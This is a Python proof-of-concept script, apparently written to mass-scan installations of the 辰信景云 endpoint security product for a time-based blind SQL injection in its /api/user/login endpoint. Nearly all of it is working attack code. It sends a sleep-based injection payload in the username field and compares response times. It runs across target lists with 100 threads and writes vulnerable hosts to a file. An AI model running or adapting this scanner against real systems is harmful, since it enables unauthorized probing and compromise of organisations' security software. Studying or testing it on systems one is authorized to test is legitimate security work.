
import sys, argparse, requests, re, time

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """
        
 ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░
                ░▒▓█▓▒░
                 ░▒▓██▓▒░

          """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="辰信景云终端安全漏洞扫描工具")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/api/user/login"
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:129.0)Gecko/20100101Firefox/129.0",
        "Accept": "application/json,text/javascript,*/*;q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip,deflate",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Content-Length": "102",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
    }
    data = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(8))a)='"
    try:
        res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, timeout=15)
        res2 = requests.get(url=target, data=data, headers=headers, verify=False, timeout=15)
        time1 = res1.elapsed.total_seconds()  # 响应的时间
        time2 = res2.elapsed.total_seconds()
        if time1 - time2 >= 5 and time1 > 5:
            print(f"[+] 该 {target} 存在延时注入漏洞")
            with open('辰信漏洞网站.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-] 该 {target} 不存在延时注入漏洞")
    except Exception as e:
        print(f"[-] 该 {target} 请求失败: {e}")


if __name__ == '__main__':
    main()

